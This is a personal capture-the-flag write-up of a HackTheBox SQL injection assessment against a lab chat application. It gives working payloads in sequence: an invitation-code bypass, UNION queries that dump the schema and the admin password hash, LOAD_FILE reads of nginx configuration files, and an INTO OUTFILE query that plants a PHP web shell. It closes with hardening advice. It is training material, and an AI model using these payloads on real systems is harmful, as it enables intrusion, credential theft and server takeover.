---
platform: hackthebox
difficulty: Completed
status: in-progress
date: 2026-10-20
tags:
---
# HTB: Skills Assessment - SQL Injection Fundamentals

**Target:** 
`154.57.164.74:42848`

---

## 01 - Scope
### Assignment:
You have been contracted by `chattr GmbH` to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with `SQL injection vulnerabilities` and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform an assessment specifically focused on testing for SQL injection vulnerabilities on the web application from a "black box" approach.

![Chattr login page with fields for username and password, login button, and a person on the phone in an office.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/sa/1.png)
### Objectives:
- **Primary Goals:**
  - [x] What is the password hash for the user 'admin'?
`$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`
  - [x] What is the root path of the web application?
`/var/www/chattr-prod`
  - [x] Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.
`061b1aeb94dec6bf5d9c27032b3c1d8d`

---

## 02 - Procedure
1. I first executed a `nmap` service scan and  `fuzzed` the website in order to get an overview:
```bash
nmap -p 42848 -sV -sC 154.57.164.74 > webservice
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020102836.png)


```bash
ffuf -u https://154.57.164.74:42848/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .php,.html,.asp,.aspx -ic 
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020105455.png)
Alright we are dealing with a `Nginx` webserver which means, that we are most likely working with a linux webserver. Chances are that `mysql` ,`mariadb` or another linux-based `DBMS` is in use.

2. I then tried to trigger any revealing responses with `'`, `"`,`#`, etc. Regardless of the input, I received the “username or password is wrong” message: ![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020110625.png)

3. I therefor checked out the `Create Account` page. In order to create an account, we will need an `invitation code`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020112835.png)
In order to bypass the `invitation code` I just added `' or '1'='1` in the HTTP POST request:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020113323.png)
Which lead to a successful account creation:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020113436.png)

4. Next up I logged in with the created user and was provided with the option to chat to with some users. So i started a chat with `@admin` and checked if it is possible to escape the `sql-input` with a simple `'` , which wasn't the case:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020113910.png)

5. After tempering around with the `send a message` field I tested, what happens if I input `'` in the `search` field, which left me with a blank conversation page. 
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020115717.png)
I eventually managed to "brake out" of the SQL-Input with `')` and checked the DB-Version and user with `UNION` requests:
```sql
test') UNION SELECT 1,2,@@version,4-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020121657.png)

```sql
test') UNION SELECT 1,2,user(),4-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020120712.png)

5. I then checked if and which DB's content I can list: 
```sql
test') UNION select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020122159.png)

```sql
test') UNION select 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020122349.png)

```sql
test') UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020123541.png)

I then filter for the `Username` `admin` and retrieved his password-hash:
```sql
test') UNION select 1,2,Username,Password from chattr.Users where Username='admin'-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020123842.png)

6. No we need to retrieve the root path of the web application. I therefor checked if we can read and write files in the file system:
```sql
test') UNION SELECT 1,2,variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020153041.png)

I then checked, if we can access the `nginx.conf` file, which can reside on several directories per default:  https://nginx.org/en/docs/beginners_guide.html
```sql
test') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020153250.png)

According to the `.conf` file the directory `/etc/nginx/sites-enabled/*` is included. Which, by default, contains only the file `default`:https://www.virtua.cloud/learn/en/concepts/nginx-config-file-structure
```sql
test') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020175057.png)
Here we can conclude, that the `index.php` is located in `root var/www/chattr-prod`, in other words the `webroot`

7. Knowing where the `webroot` is and having the “secure_file_priv” permission, RCE should be a breeze. We can simply upload a `php-webshell` to it.
```sql
test') union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- -
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020180041.png)

A simple find-command and little bit of url-encoding and the flag is located:
```bash
find / -name "flag*"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020180356.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261020180605.png)

## 03 - Hardening Steps
1. Enable `Prepared Statements`, so that user input is always treated as data and not interpreted as sql-code.
2. Remove the `FILE-privlege` from the webapp-user. For example, provide him with `SELECT, INSERT, UPDATE, DELETE` privileges.
3. Remove write permission from the user `mysql` in webroot `/var/www/chattr-prod`
4. Activate `secure_file_priv` in order to disable `LOAD_file`, i.e prevent systemfiles from beeing read. 
## 10 - Lesson Learned
1. Always test every input-fields for SQLi!
2. The webservers response-body defines which input is allowed, thus can block inapporpriate characters needed for SQLi in the browser. In order to bypass it we must either intercept the response-body and temper with the "rules" or intercept our answer and add the injection after "leaving" the browser.